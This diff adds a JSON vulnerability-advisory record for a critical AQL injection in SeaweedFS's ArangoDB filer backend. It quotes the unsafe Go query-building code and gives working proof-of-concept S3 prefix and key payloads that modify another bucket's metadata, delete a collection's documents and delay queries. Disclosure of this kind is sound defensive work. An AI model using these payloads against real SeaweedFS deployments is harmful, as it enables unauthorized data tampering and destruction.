@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-3883-fr8h-xrqg",
+  "aliases": [],
+  "title": "ArangoDB AQL Injection in S3 Listing and Recursive Deletion",
+  "summary": "### Summary\r\nThe ArangoDB filer backend builds AQL queries by concatenating S3-controlled values such as `prefix`, `marker`, and filer paths directly into the query text. An authenticated S3 user with permission to list one bucket can inject an AQL subquery that modifies metadata in another bucket's ArangoDB collection, bypassing S3 bucket authorization. The same vulnerability also allows bucket-wide metadata deletion and query-delay denial of service.\r\n\r\n### Details\r\nIn `weed/filer/arangodb/arangodb_store.go`, `ListDirectoryPrefixedEntries` inserts `startFileName` and `prefix` directly into AQL:\r\n\r\n```go\r\nif includeStartFile {\r\n\tquery = query + \" filter d.name >= \\\"\" + startFileName + \"\\\" \"\r\n} else {\r\n\tquery = query + \" filter d.name > \\\"\" + startFileName + \"\\\" \"\r\n}\r\nif prefix != \"\" {\r\n\tquery = query + fmt.Sprintf(`&& starts_with(d.name, \"%s\")`, prefix)\r\n}\r\n```\r\n\r\nThe resulting query is executed with only `dirPath` supplied as a bind variable:\r\n\r\n```go\r\ncur, err := store.database.Query(ctx, query, map[string]interface{}{\"dir\": dirPath})\r\n```\r\n\r\nThe `prefix` value is inside the second argument of `starts_with`, but it is not escaped. A value such as:\r\n\r\n```text\r\nx\" && false || (FOR q IN `injdel` LIMIT 1 UPDATE q WITH {poc:\"BYPASS_DENY\"} IN `injdel` RETURN \"\") || \"\r\n```\r\n\r\nproduces an AQL expression equivalent to:\r\n\r\n```aql\r\nstarts_with(\r\n  d.name,\r\n  \"x\" && false ||\r\n  (FOR q IN `injdel`\r\n     LIMIT 1\r\n     UPDATE q WITH {poc: \"BYPASS_DENY\"} IN `injdel`\r\n     RETURN \"\")\r\n  || \"\"\r\n)\r\n```\r\n\r\nArangoDB executes the injected subquery before the S3 listing completes. The subquery is not subject to S3 authorization because it runs with the filer’s configured ArangoDB credentials.\r\n\r\nThe recursive-delete path has the same issue. `DeleteFolderChildren` interpolates `fullpath` twice into an AQL `REMOVE` query:\r\n\r\n```go\r\nquery = query + fmt.Sprintf(`\r\nfor d in %s\r\nfilter starts_with(d.directory, \"%s/\")  || d.directory == \"%s\"\r\nremove d._key in %s`,\r\n\t\"`\"+targetCollection.Name()+\"`\",\r\n\tstrings.Join(strings.Split(string(fullpath), \"/\"), \",\"),\r\n\tstring(fullpath),\r\n\t\"`\"+targetCollection.Name()+\"`\",\r\n)\r\n```\r\n\r\nTrailing-slash S3 keys reach this code through `deleteDirectoryMarker`, which recursively removes stale `.versions` history.\r\n\r\n### PoC\r\nDeployment: SeaweedFS `30GB 4.41` with an ArangoDB-backed filer on port `8888` and S3 on port `8333`.\r\n\r\nThe `alice` identity had no `Admin` action. A temporary bucket policy denied Alice all S3 access to `injdel`:\r\n\r\n```json\r\n{\r\n  \"Version\": \"2012-10-17\",\r\n  \"Statement\": [{\r\n    \"Effect\": \"Deny\",\r\n    \"Principal\": \"*\",\r\n    \"Action\": \"s3:*\",\r\n    \"Resource\": [\r\n      \"arn:aws:s3:::injdel\",\r\n      \"arn:aws:s3:::injdel/*\"\r\n    ]\r\n  }]\r\n}\r\n```\r\n\r\nAlice's normal request was denied:\r\n\r\n```text\r\nGET /injdel/foo%22\r\n→ 403 AccessDenied\r\n```\r\n\r\nAlice then sent a normal authenticated `ListBucket` request to `injtest` with this URL-decoded `prefix`:\r\n\r\n```text\r\nx\" && false || (FOR q IN `injdel` LIMIT 1 UPDATE q WITH {poc:\"BYPASS_DENY\"} IN `injdel` RETURN \"\") || \"\r\n```\r\n\r\nThe request returned a successful S3 listing:\r\n\r\n```text\r\nGET /injtest?list-type=2&prefix=<payload>\r\n→ 200 OK\r\n```\r\n\r\nThe supposedly inaccessible `injdel` collection was modified:\r\n\r\n```json\r\n{\"name\":\"foo\\\"\",\"poc\":\"BYPASS_DENY\"}\r\n```\r\n\r\n### Destructive variant\r\n\r\nUsing the same non-admin identity, create these keys in `injtest`:\r\n\r\n```text\r\nx\" || true || \"/.versions/old\r\nx\" || true || \"/\r\n```\r\n\r\nDelete the trailing-slash marker:\r\n\r\n```text\r\nDELETE /injtest/x%22%20%7C%7C%20true%20%7C%7C%20%22/\r\n→ 204 No Content\r\n```\r\n\r\nThe `injtest` ArangoDB collection contained 15 metadata documents before the request and zero afterward, including unrelated objects.\r\n\r\n### Query-delay variant\r\n\r\nThis list prefix was accepted by the S3 API:\r\n\r\n```text\r\nx\" && false || TO_STRING(SLEEP(1)) && false || \"\r\n```\r\n\r\nWith three objects in the directory, the listing returned `200` after approximately three seconds. An unbalanced quote such as `x\"` produced an S3 `500 In...",
+  "published_at": "2026-09-12T16:08:15.000Z",
+  "modified_at": "2026-09-12T16:08:15.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.9,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-943"
+  ],
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "3.00",
+          "last_affected": "4.42"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-3883-fr8h-xrqg",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-3883-fr8h-xrqg",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-3883-fr8h-xrqg",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:cc13ee6d76afc37fb5f29922e91229938c3e576de9a96525cd410add2198ae7a",
+  "note": null
+}
